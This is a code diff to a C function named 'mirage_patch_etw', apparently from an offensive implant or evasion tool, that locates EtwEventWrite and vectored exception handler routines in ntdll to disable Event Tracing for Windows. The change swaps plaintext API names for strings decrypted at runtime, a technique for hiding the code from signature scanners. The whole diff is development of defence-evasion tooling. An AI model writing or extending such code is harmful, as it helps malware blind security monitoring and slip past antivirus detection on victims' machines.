@@ -108,17 +108,20 @@ int mirage_patch_etw(void) {
     if (!ntdll) return 0;
 
     /* Resolve EtwEventWrite (fallback to EtwEventWriteEx) */
-    void* etw_write = resolve_func(ntdll, "EtwEventWrite");
-    if (!etw_write)
-        etw_write = resolve_func(ntdll, "EtwEventWriteEx");
+    char etw_fn[32]; enc_decrypt(enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN, etw_fn);
+    void* etw_write = resolve_func(ntdll, etw_fn);
+    if (!etw_write) {
+        char etw_fn_ex[32]; enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, etw_fn_ex);
+        etw_write = resolve_func(ntdll, etw_fn_ex);
+    }
     if (!etw_write) return 0;
 
     /* Resolve VEH functions */
+    char veh_add[64]; enc_decrypt(enc_RtlAddVectoredExceptionHandler, ENC_RTLADDVECTOREDEXCEPTIONHANDLER_LEN, veh_add);
     pRtlAddVectoredExceptionHandler fnAddVEH =
-        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll,
-            "RtlAddVectoredExceptionHandler");
-    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll,
-            "RtlRemoveVectoredExceptionHandler");
+        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll, veh_add);
+    char veh_rem[64]; enc_decrypt(enc_RtlRemoveVectoredExceptionHandler, ENC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_LEN, veh_rem);
+    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, veh_rem);
     if (!fnAddVEH || !g_fnRemoveVEH) return 0;
 
     /* Install VEH */
